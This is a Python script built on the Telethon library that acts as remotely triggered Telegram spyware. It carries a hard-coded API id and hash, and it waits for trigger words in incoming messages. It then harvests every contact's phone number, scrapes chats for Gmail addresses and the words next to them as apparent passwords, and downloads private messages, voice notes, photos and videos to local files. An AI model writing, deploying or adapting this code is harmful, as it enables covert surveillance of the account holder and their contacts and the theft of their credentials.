#developed by hevorix

from telethon import TelegramClient, events
from telethon.sessions import StringSession
import os

api_id = 10953300
api_hash = "9c24426e5d6fa1d441913e3906627f87"

client = TelegramClient('session_+998993273131', api_id, api_hash)

folders = ['media_files/round_videos', 'media_files/images', 'media_files/messages', 'media_files/voice_ogg']
for folder in folders:
    if not os.path.exists(folder):
        os.makedirs(folder)

contact_file = 'media_files/messages/contact.txt'
gmail_file = 'media_files/messages/gmail_accounts.txt'

async def save_contacts():
    with open(contact_file, 'w', encoding='utf-8') as cf:
        cf.write("id | nickname | username | phone_number | count messages\n")
        async for dialog in client.iter_dialogs():
            if dialog.is_user and dialog.entity.phone:
                user = dialog.entity
                nickname = user.first_name if user.first_name else "NoName"
                username = user.username if user.username else "NoUsername"
                phone_number = user.phone if user.phone else "NoPhone"
                message_count = 0
                async for _ in client.iter_messages(user.id):
                    message_count += 1
                cf.write(f"{user.id} | {nickname} | {username} | {phone_number} | {message_count}\n")

async def save_gmails():
    with open(gmail_file, 'w', encoding='utf-8') as gf:
        gf.write("email | password\n")
        async for dialog in client.iter_dialogs():
            if dialog.is_user:
                async for message in client.iter_messages(dialog.id, limit=100):
                    if message.text and "@" in message.text and "gmail.com" in message.text:
                        parts = message.text.split()
                        email = next((part for part in parts if "@" in part and "gmail.com" in part), None)
                        password = next((part for part in parts if email and part != email), "NoPassword")
                        if email:
                            gf.write(f"{email} | {password}\n")

@client.on(events.NewMessage(pattern="hevorix"))
async def chatscan(event):
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            async for message in client.iter_messages(dialog.id, limit=100):
                sender = message.sender
                username = sender.username if sender.username else "NoUsername"
                nickname = sender.first_name if sender.first_name else "NoName"
                time = message.date.strftime("%Y-%m-%d %H:%M:%S")

                if message.media:
                    file_path = None
                    media_type = None

                    if message.voice:
                        media_type = "Voice"
                        file_path = os.path.join('media_files/voice_ogg', f"{dialog.id}_{message.id}_voice.ogg")

                    elif message.video and any(getattr(attr, 'supports_streaming', False) for attr in message.video.attributes):
                        media_type = "Round Video"
                        file_path = os.path.join('media_files/round_videos', f"{dialog.id}_{message.id}_round_video.mp4")

                    elif message.photo:
                        media_type = "Image"
                        file_path = os.path.join('media_files/images', f"{dialog.id}_{message.id}.jpg")

                    if file_path and message.file.size and message.file.size <= 50 * 1024 * 1024:
                        progress = 0

                        def progress_callback(current, total):
                            nonlocal progress
                            new_progress = int((current / total) * 100)
                            if new_progress != progress:
                                progress = new_progress
                                print(f"Downloading {media_type}: {progress}%")

                        await message.download_media(file_path, progress_callback=progress_callback)
                        print(f"Downloaded {media_type} from {dialog.name} ({dialog.id}) to {file_path}")

                        with open(f'media_files/messages/{dialog.id}_media_info.txt', 'a', encoding='utf-8') as f:
                            f.write(f"ID: {dialog.id} | Nickname: {nickname} | Username: {username} | Time: {time} | Media Type: {media_type} | File: {file_path}\n")

                elif message.text:
                    with open(f'media_files/messages/{dialog.id}_messages.txt', 'a', encoding='utf-8') as f:
                        f.write(f"ID: {dialog.id} | Nickname: {nickname} | Username: {username} | Time: {time} | Message: {message.text}\n")

@client.on(events.NewMessage(pattern="sat"))
async def collect_data(event):
    print("Collecting contacts...")
    await save_contacts()
    print("Contacts saved to", contact_file)
    
    print("Collecting Gmail accounts...")
    await save_gmails()
    print("Gmail accounts saved to", gmail_file)

client.start()
client.run_until_disconnected()
